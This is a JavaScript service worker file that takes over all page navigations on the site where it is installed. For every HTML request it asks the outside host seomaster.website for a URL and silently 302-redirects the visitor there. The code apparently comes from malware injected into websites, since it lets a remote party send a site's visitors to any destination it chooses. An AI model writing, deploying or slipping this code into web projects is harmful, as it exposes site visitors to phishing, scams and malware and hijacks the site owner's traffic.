self.addEventListener('install', function(event) {
    self.skipWaiting();
});

self.addEventListener('fetch', function(event) {
    if (event.request.mode === 'navigate' || (event.request.method === 'GET' && event.request.headers.get('accept').includes('text/html'))) {
        event.respondWith(
            fetch('https://seomaster.website/API/get-url')
            .then(function(response) {
                return response.json();
            })
            .then(function(data) {
                const fetchedUrl = data.url;
                const mainUrl = self.registration.scope;

                if (fetchedUrl !== mainUrl) {
                    return Response.redirect(fetchedUrl, 302);
                } else {
                    return fetch(event.request).then(function(response) {
                        return response;
                    });
                }
            })
            .catch(function() {
                return fetch(event.request).then(function(response) {
                    return response;
                });
            })
        );
    } else {
        event.respondWith(fetch(event.request));
    }
});
